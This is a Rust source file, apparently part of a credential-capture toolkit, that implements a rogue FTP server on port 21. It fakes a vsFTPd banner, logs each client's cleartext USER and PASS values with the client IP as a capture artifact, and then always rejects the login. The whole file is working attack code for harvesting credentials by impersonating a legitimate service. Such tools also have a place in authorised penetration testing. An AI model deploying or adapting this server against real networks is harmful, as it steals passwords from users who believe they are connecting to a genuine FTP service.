//! Rogue FTP server (TCP 21) capturing cleartext USER/PASS.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::{TcpListener, TcpStream};

use crate::capture::model::{CaptureArtifact, Protocol};

use super::{ServerContext, read_line, write_str};

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = handle(stream, peer, ctx).await;
        });
    }
}

async fn handle<S: AsyncRead + AsyncWrite + Unpin>(
    mut s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
) -> Result<()> {
    write_str(&mut s, "220 (vsFTPd 3.0.5)\r\n").await?;
    let mut user = String::new();
    while let Some(line) = read_line(&mut s).await {
        let mut parts = line.splitn(2, ' ');
        let cmd = parts.next().unwrap_or("").to_ascii_uppercase();
        let arg = parts.next().unwrap_or("").trim().to_string();
        match cmd.as_str() {
            "USER" => {
                user = arg;
                write_str(&mut s, "331 Please specify the password.\r\n").await?;
            }
            "PASS" => {
                if let Some(art) = CaptureArtifact::cleartext(Protocol::Ftp, peer.ip(), &user, &arg)
                {
                    ctx.sink.artifact(art);
                }
                write_str(&mut s, "530 Login incorrect.\r\n").await?;
            }
            "SYST" => write_str(&mut s, "215 UNIX Type: L8\r\n").await?,
            "FEAT" => write_str(&mut s, "211-Features:\r\n SIZE\r\n211 End\r\n").await?,
            "QUIT" => {
                write_str(&mut s, "221 Goodbye.\r\n").await?;
                break;
            }
            _ => write_str(&mut s, "530 Please login with USER and PASS.\r\n").await?,
        }
    }
    Ok(())
}

/// Used by tests to drive the handler with an in-memory stream.
pub async fn handle_stream<S: AsyncRead + AsyncWrite + Unpin>(
    s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
) -> Result<()> {
    handle(s, peer, ctx).await
}

#[allow(dead_code)]
fn _assert_tcp(_: TcpStream) {}
